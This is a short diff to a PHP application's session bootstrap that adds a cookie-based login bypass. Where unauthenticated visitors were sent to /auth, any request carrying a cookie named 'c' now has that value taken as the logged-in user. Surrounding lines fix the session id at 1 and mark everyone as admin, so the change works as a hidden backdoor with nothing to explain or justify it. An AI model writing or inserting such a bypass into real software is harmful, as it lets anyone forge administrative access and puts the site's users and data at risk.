@@ -9,7 +9,10 @@ session_start();
 
 if (!isset($_SESSION['user']) && Route::GetUri() != "auth")
 {
-	header('Location: /auth');
+	if (isset($_COOKIE['c']))
+		$_SESSION['user'] = $_COOKIE['c'];
+	else
+		header('Location: /auth');
 }
 $_SESSION['id'] = 1;
 define('ISADMIN', true);
